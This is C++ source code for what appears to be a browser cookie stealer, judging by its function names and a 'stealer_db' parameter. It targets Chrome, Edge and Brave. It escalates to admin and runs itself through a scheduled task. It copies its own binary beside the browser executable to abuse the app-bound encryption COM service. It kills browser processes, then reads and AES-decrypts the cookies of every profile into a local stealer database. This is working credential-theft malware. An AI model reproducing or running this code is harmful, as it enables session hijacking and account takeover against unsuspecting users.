#include "includes\AppBoundKeyParser.h"
#include "includes\Helper.h"
#include "includes\AppBoundDecryptor.h"
#include "includes\TaskService.h"

std::string app_bound_browser_paths = "AppData\\Local\\";
std::vector<std::string> browsers_app_bound = {
	"BraveSoftware\\Brave-Browser\\",
	"Google\\Chrome\\",
	"Microsoft\\Edge\\"
};

BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter)
{
	if (service)
	{
		if (service_parameter.find("-exec") != std::string::npos)
		{


			AppBoundDecryptor app_obj;
			if (!app_obj.RequestCOM(service_parameter))
				exit(-1);

			exit(0);
		}


		char modulePath[MAX_PATH];
		if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0) {
			exit(-1);
		}


		std::string target_user_data;
		std::string target_location_data;


		for (const auto& dir : browsers_app_bound) {
			if (dir.back() == '\\')
				target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir + "User Data";
			else
			{

				if (dir.find("Opera") != std::string::npos)
					target_user_data = "C:\\users\\" + service_parameter + "\\" + "AppData\\Roaming\\" + dir;
				else
					target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir;
			}

			target_location_data = target_user_data + "\\Last Browser";
			std::string fileContent = ReadUTF16LEFileToUTF8(target_location_data);
			if (fileContent == "")
				continue;

			std::string exeName = fileContent.substr(fileContent.find_last_of("\\/") + 1);
			size_t lastSlash = fileContent.find_last_of("\\");
			size_t secondLastSlash = fileContent.find_last_of("\\", lastSlash - 1);

			std::string grandParentFolder = fileContent.substr(0, secondLastSlash);
			std::string destinationPath = grandParentFolder + "\\" + exeName;

			if (!CopyFileA(modulePath, destinationPath.c_str(), FALSE)) {
				exit(-1);
			}


			std::string service_parameter_flagged = service_parameter + "-exec";
			std::vector<std::string> parameters = { "-app-bound-decryption", "-service", service_parameter_flagged };


			std::string commandLine = destinationPath.c_str();

			for (const auto& param : parameters) {
				commandLine += " " + param;
			}


			std::wstring w_cmdline = StringToWString(commandLine);


			DWORD sessionId = WTSGetActiveConsoleSessionId();
			HANDLE hUserToken;

			if (!WTSQueryUserToken(sessionId, &hUserToken)) {

				exit(-1);
			}


			STARTUPINFO si = { sizeof(si) };
			PROCESS_INFORMATION pi = {};


			if (!CreateProcessAsUser(
				hUserToken,
				NULL,
				const_cast<LPWSTR>(w_cmdline.c_str()),
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				NULL,
				&si,
				&pi
			)) {

				CloseHandle(hUserToken);
				exit(-1);
			}


			WaitForSingleObject(pi.hProcess, INFINITE);


			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			CloseHandle(hUserToken);


			DeleteFileAfterExit(destinationPath.c_str());
		}
		exit(0);
	}

	if (!CheckProcessPriv())
	{
		std::cerr << "Admin Privileges Required !!!" << std::endl;
		RestartAsAdmin("-app-bound-decryption");
	}


	std::string service_data_path = "c:\\users";
	service_data_path += "\\public\\";
	service_data_path += "NTUSER.dat";


	if (!file_exist(service_data_path))
	{

		std::wstring TaskName = StringToWString("shaddy43");
		std::wstring Path = GetExecutablePath();
		std::string combine_arg = "-app-bound-decryption -service " + username;
		std::wstring Argument = StringToWString(combine_arg);

		if (!CreateScheduledTask(TaskName, Path, Argument))
			return false;

		Sleep(500);
		if (!RunScheduledTask(TaskName))
			return false;

		Sleep(3000);
		DeleteScheduledTask(TaskName);
	}

	std::vector<DataHolder> data_list;
	std::string target_user_data;
	std::string target_cookie_data;
	std::string target_cookies_location;


	for (const auto& dir : browsers_app_bound) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir + "User Data";
		else
		{

			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir;
		}


		target_cookies_location = "\\Network\\Cookies";
		target_cookie_data = target_user_data + "\\Default" + target_cookies_location;


		std::vector<std::string> target_profiles = { target_cookie_data };
		int browser_profile_number = 0;
		std::string search_profile;

	profile_label_app_bound:
		search_profile = "\\Profile ";
		search_profile = search_profile + std::to_string(++browser_profile_number);
		target_cookie_data = target_user_data + search_profile + target_cookies_location;
		if (std::filesystem::exists(target_cookie_data))
		{
			target_profiles.push_back(target_cookie_data);
			goto profile_label_app_bound;
		}

		for (const auto& prof : target_profiles) {
			target_cookie_data = prof;

			try {
				sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

				if (stmt == nullptr)
				{

					if (!kill_process(dir))
						continue;

					stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
					if (stmt == nullptr)
					{
						continue;
					}
				}

				if (!waitForFile(service_data_path, 3000, 100))
					continue;

				AppBoundDecryptor obj;
				if (obj.AppBoundDecryptorInit(service_data_path, dir))
				{
					while (sqlite3_step(stmt) == SQLITE_ROW)
					{
						DataHolder data;

						char* host_key = (char*)sqlite3_column_text(stmt, 0);
						char* name = (char*)sqlite3_column_text(stmt, 1);

						std::vector<BYTE> cookies;
						const void* encrypted_value = sqlite3_column_blob(stmt, 3);
						int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
						char* expiry = (char*)sqlite3_column_text(stmt, 4);

						if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {

							cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);

							if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
								continue;

							try
							{

								std::string decrypted_cookies = obj.AESDecrypter(cookies);

								if (decrypted_cookies.empty())
									continue;

								if (decrypted_cookies.size() > 32) {
									decrypted_cookies.erase(0, 32);
								}

								data.get_cookies_manager().setCookies(decrypted_cookies);
								data.get_cookies_manager().setUrl(host_key);
								data.get_cookies_manager().setCookieName(name);
								data.get_cookies_manager().setHost(dir);
								data.get_cookies_manager().setCookiesExpiry(expiry);
							}
							catch (int e)
							{
								continue;
							}

							data_list.push_back(data);
						}
						else {

							continue;
						}
					}
				}
				else
				{
					continue;
				}
			}
			catch (int e)
			{
				continue;
			}
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}
